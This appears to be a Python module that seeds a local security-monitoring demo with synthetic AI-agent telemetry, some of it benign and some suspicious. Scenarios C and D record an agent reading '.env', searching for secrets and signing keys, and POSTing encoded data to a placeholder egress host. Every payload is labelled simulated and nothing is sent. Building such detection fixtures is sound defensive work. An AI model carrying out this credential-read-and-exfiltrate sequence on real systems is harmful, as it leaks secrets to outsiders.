"""Isolated synthetic telemetry scenarios for the local SOC demonstration."""
from __future__ import annotations

import copy
import sqlite3
import threading
import time
import uuid
from contextlib import contextmanager
from pathlib import Path
from typing import Any, Iterator

from core.session_review import get_review_status
from core.telemetry import TelemetryStore, init_db

DEMO_EPOCH = 1_735_689_600.0
DEMO_SCENARIOS: tuple[dict[str, Any], ...] = (
    {
        "id": "scenario-a-normal-code-review",
        "name": "A · Normal Code Review Agent",
        "agent_id": "demo-code-reviewer",
        "description": "Synthetic source reads, code searches, and a review summary.",
        "events": (
            ("read_file", {"path": "src/utils.py"}),
            ("read_file", {"path": "README.md"}),
            ("search_code", {"query": "rate limit"}),
            ("search_code", {"query": "login"}),
            ("read_file", {"path": "README.md"}),
            ("report", {"summary": "Reviewed, no blocking issues."}),
        ),
    },
    {
        "id": "scenario-b-research-assistant",
        "name": "B · Research Assistant",
        "agent_id": "demo-research-assistant",
        "description": "Synthetic file reads, searches, and ordinary HTTP request metadata.",
        "events": (
            ("read_file", {"path": "notes.txt"}),
            ("http_request", {"url": "https://flask.palletsprojects.com/"}),
            ("read_file", {"path": "README.md"}),
            ("search_code", {"query": "rate limit"}),
            ("search_code", {"query": "login"}),
            ("report", {"summary": "Reviewed, no blocking issues."}),
        ),
    },
    {
        "id": "scenario-c-suspicious-file-access",
        "name": "C · Suspicious File Access",
        "agent_id": "demo-suspicious-agent",
        "description": "Synthetic sensitive-path metadata, rapid searches, and a command-tool invocation record.",
        "events": (
            ("read_file", {"path": ".env"}),
            ("shell_execute", {"command": "[SIMULATED] echo demo-only"}),
            ("search_code", {"query": "session secret"}),
            ("search_code", {"query": "cookie signing key"}),
            ("read_file", {"path": "config/settings.py"}),
            ("search_code", {"query": "credential configuration"}),
            ("read_file", {"path": "docs/security.md"}),
            ("search_code", {"query": "environment variables"}),
            ("read_file", {"path": "src/auth/session.py"}),
            ("report", {"summary": "Synthetic suspicious-access sequence complete."}),
        ),
    },
    {
        "id": "scenario-d-suspicious-outbound-attack-chain",
        "name": "D · Suspicious Outbound Activity / Attack Chain",
        "agent_id": "demo-attack-chain",
        "description": "Synthetic sensitive-read, execution, and outbound-tool metadata in one session.",
        "events": (
            ("read_file", {"path": ".env"}),
            ("encode_data", {"payload": "SYNTHETIC-DEMO-DATA-ONLY"}),
            ("shell_execute", {"command": "[SIMULATED] echo no-op"}),
            (
                "http_request",
                {
                    "method": "POST",
                    "url": "https://demo.example.invalid/egress",
                    "body": "SYNTHETIC-DEMO-DATA-ONLY",
                },
            ),
            ("report", {"summary": "Synthetic chain recorded; no request was sent."}),
        ),
    },
)

_SCENARIO_BY_ID = {scenario["id"]: scenario for scenario in DEMO_SCENARIOS}
_SCENARIO_INDEX = {scenario["id"]: index for index, scenario in enumerate(DEMO_SCENARIOS)}


def list_demo_scenarios() -> list[dict[str, Any]]:
    return [
        {
            "id": scenario["id"],
            "name": scenario["name"],
            "agent_id": scenario["agent_id"],
            "description": scenario["description"],
            "event_count": len(scenario["events"]),
            "classification": "SIMULATED",
        }
        for scenario in DEMO_SCENARIOS
    ]


def generate_scenario_events(scenario_id: str) -> list[dict[str, Any]]:
    """Return a fresh deterministic copy of the selected safe event fixture."""
    scenario = _SCENARIO_BY_ID.get(scenario_id)
    if scenario is None:
        raise ValueError("Unknown demo scenario.")
    return [
        {"tool_name": tool_name, "arguments": copy.deepcopy(arguments)}
        for tool_name, arguments in scenario["events"]
    ]


class DemoModeService:
    """Persist synthetic sessions in a database separate from live telemetry."""

    def __init__(self, database_path: Path):
        self.database_path = Path(database_path).expanduser().resolve()
        self._lock = threading.RLock()

    @contextmanager
    def _connect(self) -> Iterator[sqlite3.Connection]:
        connection = sqlite3.connect(self.database_path, timeout=5.0)
        connection.row_factory = sqlite3.Row
        try:
            yield connection
            connection.commit()
        except Exception:
            connection.rollback()
            raise
        finally:
            connection.close()

    def _ensure_schema(self) -> None:
        self.database_path.parent.mkdir(parents=True, exist_ok=True)
        if self.database_path.exists():
            connection = sqlite3.connect(self.database_path, timeout=5.0)
            try:
                tables = {
                    row[0]
                    for row in connection.execute(
                        "SELECT name FROM sqlite_master WHERE type = 'table'"
                    )
                }
            finally:
                connection.close()
            if "demo_runs" not in tables:
                raise RuntimeError(
                    "Refusing to initialize an unrecognized existing demo database."
                )
        init_db(self.database_path)
        with self._connect() as connection:
            connection.executescript(
                """
                CREATE TABLE IF NOT EXISTS demo_runs (
                    run_id TEXT PRIMARY KEY,
                    created_at REAL NOT NULL
                );
                CREATE TABLE IF NOT EXISTS demo_run_sessions (
                    run_id TEXT NOT NULL,
                    scenario_id TEXT NOT NULL,
                    session_id TEXT NOT NULL UNIQUE,
                    PRIMARY KEY (run_id, scenario_id)
                );
                CREATE TABLE IF NOT EXISTS demo_state (
                    singleton INTEGER PRIMARY KEY CHECK (singleton = 1),
                    active_run_id TEXT NOT NULL
                );
                """
            )

    def _active_run_id(self) -> str | None:
        with self._connect() as connection:
            row = connection.execute(
                "SELECT active_run_id FROM demo_state WHERE singleton = 1"
            ).fetchone()
        return str(row["active_run_id"]) if row else None

    def _has_demo_schema(self) -> bool:
        if not self.database_path.is_file():
            return False
        connection = sqlite3.connect(self.database_path, timeout=5.0)
        try:
            row = connection.execute(
                "SELECT 1 FROM sqlite_master WHERE type = 'table' AND name = 'demo_runs'"
            ).fetchone()
        finally:
            connection.close()
        return row is not None

    def _delete_run(self, run_id: str) -> bool:
        with self._connect() as connection:
            exists = connection.execute(
                "SELECT 1 FROM demo_runs WHERE run_id = ?", (run_id,)
            ).fetchone()
            if exists is None:
                return False
            session_ids = [
                row["session_id"]
                for row in connection.execute(
                    "SELECT session_id FROM demo_run_sessions WHERE run_id = ?",
                    (run_id,),
                ).fetchall()
            ]
            for session_id in session_ids:
                connection.execute(
                    "DELETE FROM session_review_events WHERE session_id = ?",
                    (session_id,),
                )
                connection.execute(
                    "DELETE FROM session_reviews WHERE session_id = ?",
                    (session_id,),
                )
                connection.execute(
                    "DELETE FROM tool_definition_events WHERE session_id = ?",
                    (session_id,),
                )
                connection.execute(
                    "DELETE FROM tool_calls WHERE session_id = ?",
                    (session_id,),
                )
                connection.execute(
                    "DELETE FROM sessions WHERE session_id = ?",
                    (session_id,),
                )
            connection.execute(
                "DELETE FROM demo_run_sessions WHERE run_id = ?", (run_id,)
            )
            connection.execute("DELETE FROM demo_runs WHERE run_id = ?", (run_id,))
            connection.execute(
                "DELETE FROM demo_state WHERE singleton = 1 AND active_run_id = ?",
                (run_id,),
            )
        return True

    def load(self, scenario_id: str | None = None) -> str:
        if scenario_id is not None and scenario_id not in _SCENARIO_BY_ID:
            raise ValueError("Unknown demo scenario.")

        selected = [
            scenario
            for scenario in DEMO_SCENARIOS
            if scenario_id is None or scenario["id"] == scenario_id
        ]
        with self._lock:
            self._ensure_schema()
            previous_run = self._active_run_id()
            if previous_run is not None:
                self._delete_run(previous_run)

            run_id = uuid.uuid4().hex
            with self._connect() as connection:
                connection.execute(
                    "INSERT INTO demo_runs (run_id, created_at) VALUES (?, ?)",
                    (run_id, time.time()),
                )
                connection.execute(
                    """INSERT INTO demo_state (singleton, active_run_id) VALUES (1, ?)
                       ON CONFLICT(singleton) DO UPDATE SET active_run_id = excluded.active_run_id""",
                    (run_id,),
                )

            try:
                for scenario in selected:
                    scenario_key = scenario["id"]
                    store = TelemetryStore(scenario["agent_id"], self.database_path)
                    with self._connect() as connection:
                        connection.execute(
                            """INSERT INTO demo_run_sessions
                               (run_id, scenario_id, session_id) VALUES (?, ?, ?)""",
                            (run_id, scenario_key, store.session_id),
                        )

                    start_time = DEMO_EPOCH + _SCENARIO_INDEX[scenario_key] * 3600
                    events = generate_scenario_events(scenario_key)
                    for sequence, event in enumerate(events, start=1):
                        store.log_call(
                            event["tool_name"],
                            event["arguments"],
                            duration_ms=float(5 + sequence * 3),
                            is_error=False,
                            result_summary=(
                                f"SIMULATED | run_id={run_id} | "
                                f"scenario={scenario_key} | event={sequence}"
                            ),
                        )
                    store.end_session()

                    with self._connect() as connection:
                        connection.execute(
                            "UPDATE sessions SET started_at = ?, ended_at = ? WHERE session_id = ?",
                            (
                                start_time,
                                start_time + 0.07 * (len(events) + 1),
                                store.session_id,
                            ),
                        )
                        for sequence, event in enumerate(events, start=1):
                            connection.execute(
                                """UPDATE tool_calls SET called_at = ?
                                   WHERE session_id = ? AND sequence_num = ?""",
                                (
                                    start_time + 0.07 * sequence,
                                    store.session_id,
                                    sequence,
                                ),
                            )
                return run_id
            except Exception:
                self._delete_run(run_id)
                raise

    def reset(self, run_id: str) -> bool:
        if not isinstance(run_id, str) or len(run_id) != 32:
            raise ValueError("Invalid demo run_id.")
        with self._lock:
            if not self._has_demo_schema():
                return False
            return self._delete_run(run_id)

    def contains_session(self, run_id: str, session_id: str) -> bool:
        if not self._has_demo_schema():
            return False
        with self._connect() as connection:
            row = connection.execute(
                """SELECT 1 FROM demo_run_sessions
                   WHERE run_id = ? AND session_id = ?""",
                (run_id, session_id),
            ).fetchone()
        return row is not None

    def read_run(self, run_id: str | None = None) -> dict[str, Any] | None:
        if not self._has_demo_schema():
            return None
        selected_run_id = run_id or self._active_run_id()
        if selected_run_id is None:
            return None

        with self._connect() as connection:
            run = connection.execute(
                "SELECT run_id, created_at FROM demo_runs WHERE run_id = ?",
                (selected_run_id,),
            ).fetchone()
            if run is None:
                return None
            mappings = connection.execute(
                """SELECT scenario_id, session_id FROM demo_run_sessions
                   WHERE run_id = ? ORDER BY scenario_id""",
                (selected_run_id,),
            ).fetchall()
            sessions = []
            for mapping in mappings:
                session = connection.execute(
                    """SELECT session_id, agent_id, started_at, ended_at
                       FROM sessions WHERE session_id = ?""",
                    (mapping["session_id"],),
                ).fetchone()
                if session is None:
                    continue
                calls = connection.execute(
                    """SELECT id, session_id, sequence_num, tool_name, arguments_json,
                              called_at, duration_ms, is_error, result_summary
                       FROM tool_calls WHERE session_id = ?
                       ORDER BY sequence_num, id""",
                    (mapping["session_id"],),
                ).fetchall()
                scenario = _SCENARIO_BY_ID[mapping["scenario_id"]]
                sessions.append(
                    {
                        "scenario_id": mapping["scenario_id"],
                        "scenario_name": scenario["name"],
                        "agent_id": session["agent_id"],
                        "session": dict(session),
                        "calls": [dict(row) for row in calls],
                        "review": get_review_status(connection, session["session_id"]),
                    }
                )
        return {
            "run_id": run["run_id"],
            "created_at": run["created_at"],
            "classification": "SIMULATED",
            "scenarios": sessions,
        }

    def session_belongs_to_run(self, run_id: str, session_id: str) -> bool:
        return self.contains_session(run_id, session_id)
